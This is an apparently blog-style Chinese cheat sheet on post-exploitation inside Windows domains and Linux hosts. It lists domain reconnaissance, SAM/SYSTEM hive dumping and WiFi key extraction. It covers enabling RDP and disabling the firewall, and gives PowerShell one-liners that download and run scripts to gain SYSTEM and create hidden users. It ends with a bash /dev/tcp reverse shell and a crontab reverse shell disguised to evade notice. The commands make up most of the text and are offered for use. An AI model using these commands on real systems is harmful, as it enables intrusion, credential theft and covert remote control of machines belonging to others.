# 内网渗透知识点总结  
前期已经利用相关漏洞getshell
(从零学习内网渗透)https://blog.csdn.net/Fly_hps/article/details/80780989
## 信息收集
```   
    query user || qwinsta 查看当前在线用户
    net user  查看本机用户
    net user /domain 查看域用户
    net view & net group "domain computers" /domain 查看当前域计算机列表 第二个查的更多
    net view /domain 查看有几个域
    net view \\\\dc   查看 dc 域内共享文件
    net group /domain 查看域里面的组
    net group "domain admins" /domain 查看域管
    net localgroup administrators /domain   /这个也是查域管，是升级为域控时，本地账户也成为域管
    net group "domain controllers" /domain 域控
    net time /domain 
    net config workstation   当前登录域 - 计算机名 - 用户名
    net use \\\\域控(如pc.xx.com) password /user:xxx.com\username 相当于这个帐号登录域内主机，可访问资源
    ipconfig
    systeminfo
    tasklist /svc
    tasklist /S ip /U domain\username /P /V 查看远程计算机 tasklist
    net localgroup administrators && whoami 查看当前是不是属于管理组
    netstat -ano
    nltest /dclist:xx  查看域控
    whoami /all 查看 Mandatory Label uac 级别和 sid 号
    net sessoin 查看远程连接 session (需要管理权限)
    net share     共享目录
    cmdkey /l   查看保存登陆凭证
    echo %logonserver%  查看登陆域
    spn –l administrator spn 记录
    set  环境变量
    dsquery server - 查找目录中的 AD DC/LDS 实例
    dsquery user - 查找目录中的用户
    dsquery computer 查询所有计算机名称 windows 2003
    dir /s *.exe 查找指定目录下及子目录下没隐藏文件
    arp -a
```
## 密码脱取工具 和 相关命令
### Mimikatz
命令使用:https://www.cnblogs.com/pursuitofacm/p/6704219.html?utm_source=itdadao&utm_medium=referral</br>
开启绕过:https://www.freebuf.com/articles/web/176796.html</br>
Mimikatz小实验：黄金票据+dcsync https://www.freebuf.com/sectool/112594.html</br>
### NetPass
下载https://www.nirsoft.net/utils/network_password_recovery.html</br>
### 相关命令
```
    netsh wlan show profile 	查处 wifi 名
    netsh wlan show profile WiFi-name key=clear 获取对应 wifi 的密码ie 代理
    
    reg save hklm\sam C:\hash\sam.hive
    reg save hklm\system C:\hash\system.hive  直接执行可以把windows里所有用户的hash在注册表中导出到文件里

    reg query "HKEY_USERSS-1-5-21-1563011143-1171140764-1273336227-500SoftwareMicrosoftWindowsCurrentVersionInternet Settings" /v ProxyServer
    reg query "HKEY_CURRENT_USERSoftwareMicrosoftWindowsCurrentVersionInternet Settings"pac 代理相关

```
## 其他常用命令
```
    ping       icmp 连通性
    nslookup www.baidu.com vps-ip dns 连通性
    dig @vps-ip www.baidu.com
    curl vps:8080  http 连通性
    tracert bitsadmin /transfer n http://ip/xx.exe C:\windows\temp\x.exe一种上传文件 >= 2008
    fuser -nv tcp 80 查看端口 pid
    rdesktop -u username ip linux 连接 win 远程桌面 (有可能不成功)
    where file win 查找文件是否存在 找路径，Linux 下使用命令 find -name *.jsp 来查找，Windows 下，使用 for /r c:\windows\temp\ %i in (file lsss.dmp) do @echo %i
    netstat -apn | grep 8888   kill -9 PID   查看端口并 kill
```
## 远程登录主机
### 端口查看
```
    netstat -ano   没有开启 3389 端口,复查下
    tasklist /svc,查 svchost.exe 对应的 TermService 的 pid,看 netstat 相等的 pid 即 3389 端口.
```
### 注册表开启3389
```
    REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
    REG ADD "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 0x00000d3d /f 开启3389
    
如果系统未配置过远程桌面服务，第一次开启时还需要添加防火墙规则，允许 3389 端口，命令如下:
    netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow
关闭防火墙
    netsh firewall set opmode mode=disable
```
还是无法添加:    3389user http://www.91ri.org/5866.html </br>
### 创建用户(隐藏)
```
开启 sys 权限 cmd:
    IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-TokenManipulation.ps1');Invoke-TokenManipulation -CreateProcess 'cmd.exe' -Username 'nt authority\system'
add user 并隐藏:
    IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/3gstudent/Windows-User-Clone/master/Windows-User-Clone.ps1')
```
Windows 系统的帐户隐藏 ： https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%B8%90%E6%88%B7%E9%9A%90%E8%97%8F/ </br>
windows 的 RDP 连接记录:    http://rcoil.me/2018/05/%E5%85%B3%E4%BA%8Ewindows%E7%9A%84RDP%E8%BF%9E%E6%8E%A5%E8%AE%B0%E5%BD%95 </br>

## linux bash 
```
    bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`bash -i
    ` 交互的 shell 
    `&` 标准错误输出到标准输出
    `/dev/tcp/10.0.0.1/8080` 建立 socket ip port
    `0>&1` 标准输入到标准输出

猥琐版
    (crontab -l;printf "*/60 * * * * exec 9<> /dev/tcp/IP/PORT;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i;\rno crontab for whoami%100c\n")|crontab -
```
详细介绍 https://github.com/tom0li/security_circle/blob/master/15288418585142.md </br>
未完待续...
